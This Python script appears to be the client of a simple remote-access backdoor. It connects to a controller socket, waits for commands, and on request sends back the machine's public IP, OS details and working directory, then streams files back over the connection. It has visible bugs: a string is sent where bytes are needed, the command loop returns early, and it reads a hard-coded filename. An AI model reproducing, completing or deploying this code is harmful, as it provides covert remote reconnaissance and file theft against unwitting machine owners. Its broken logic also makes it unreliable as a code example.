import socket
import requests as req
import os
import subprocess
import platform

connected = True
def connection():
    HOST = '127.0.0.1'
    PORT = 6654
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.connect((HOST,PORT))
    return sock
def commands(command , sock):
    if command == '1':
        res_req = req.get('https://api.ipify.org')
        data_req = res_req.json()
        Os = platform.platform()
        working_dir = os.getcwd()
        res = f'{data_req}\n{Os}\n Directory : {working_dir}'
        resp = sock.sendall(res)
    elif command == '2':
        choice = sock.recv(1024).decode().strip()
        file_size = os.path.getsize(choice)
        sock.sendall(file_size.to_bytes(8, "big"))
        with open("movie.mp4", "rb") as f:
            while chunk := f.read(4096):
                sock.sendall(chunk)
def handle_commands(sock):
    while connected:
        command = sock.recv(1024).decode().strip()
        return command
def main():
    sock = connection()
    while connected:
        command = handle_commands(sock)
        commands(command, sock)
main()
